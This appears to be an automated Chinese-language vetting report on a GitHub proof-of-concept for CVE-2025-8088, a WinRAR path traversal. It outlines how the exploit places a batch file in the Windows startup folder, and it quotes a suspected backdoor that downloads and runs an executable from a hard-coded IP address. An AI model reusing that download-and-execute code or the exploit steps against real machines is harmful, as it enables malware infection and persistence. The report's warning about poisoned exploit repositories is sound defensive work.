## CVE-2025-8088-WinRAR路径遍历

**漏洞编号:** CVE-2025-8088

**漏洞类型:** 路径遍历

**影响应用:** WinRAR

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** <= 7.12

**利用条件:** 需要用户交互（解压恶意RAR文件）

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-8088 是 WinRAR Windows 版本中的一个路径遍历漏洞，允许攻击者通过精心构造的恶意压缩文件执行任意代码。攻击者可以利用此漏洞将恶意文件复制到敏感目录，例如 Windows 启动文件夹，从而实现持久化。从搜索结果来看，该漏洞已被积极利用，并且有公开的 POC 代码。

**有效性：**
提供的 POC 代码似乎有效。漏洞库信息和搜索结果都表明这是一个真实的、已被利用的漏洞。POC 代码通过创建包含路径遍历序列的 RAR 文件，将 payload.bat 文件放置到启动目录中，从而实现任意代码执行。

**投毒风险：**
该仓库存在一定的投毒风险。虽然主要功能是利用 CVE-2025-8088 漏洞，但代码中存在从远程 URL 下载可执行文件的操作：

```python
url = "http://176.65.132.139/file_cache.exe"
...
with requests.get(url, stream=True) as r:
    with open(local_path, "wb") as f:
        for chunk in r.iter_content(chunk_size=8192):
            f.write(chunk)
```

这段代码会从 `http://176.65.132.139/file_cache.exe` 下载一个名为 `cache_register.exe` 的可执行文件并执行。如果该服务器被攻陷，或者攻击者恶意修改该 URL，则可能导致用户下载并执行恶意代码，从而实现投毒。此外，config.py和POC也存在后门代码的可能性。

**利用方式：**
1.  **生成 Payload:**  `generate_payload()` 函数创建一个简单的批处理文件 (payload.bat)，该文件会在后台启动记事本（notepad.exe）。
2.  **生成 Decoy 文件:**  `generate_decoys()` 函数创建多个诱饵文件（文本文件），这些文件被设计成在解压后看起来像是正常的文件，以迷惑用户。
3.  **创建 RAR 头:** `create_rar_header()` 函数创建自定义的 RAR 文件头，其中包含路径遍历字符串，指向 Windows 启动目录。这些头信息会被添加到压缩文件中，以便在解压缩时将文件写入指定位置。
4.  **构建 Exploit 压缩包:**  `build_exploit_archive()` 函数将所有诱饵文件和 payload 文件打包到一个 RAR 压缩文件中。关键在于诱饵文件的文件头包含路径遍历字符，使得这些文件在解压时会被写入到 Windows 启动目录。
5.  **用户交互：** 攻击者将此恶意 RAR 文件发送给受害者。当受害者使用 WinRAR 解压此文件时，由于文件头中包含路径遍历，payload.bat 文件会被写入到 Windows 启动目录。
6.  **代码执行：** 下次系统启动时，Windows 会自动执行启动目录中的所有程序，包括 payload.bat，从而在后台启动记事本。

**项目地址:** [haspread/CVE-2025-8088](https://github.com/haspread/CVE-2025-8088)

**漏洞详情:** [CVE-2025-8088](https://nvd.nist.gov/vuln/detail/CVE-2025-8088)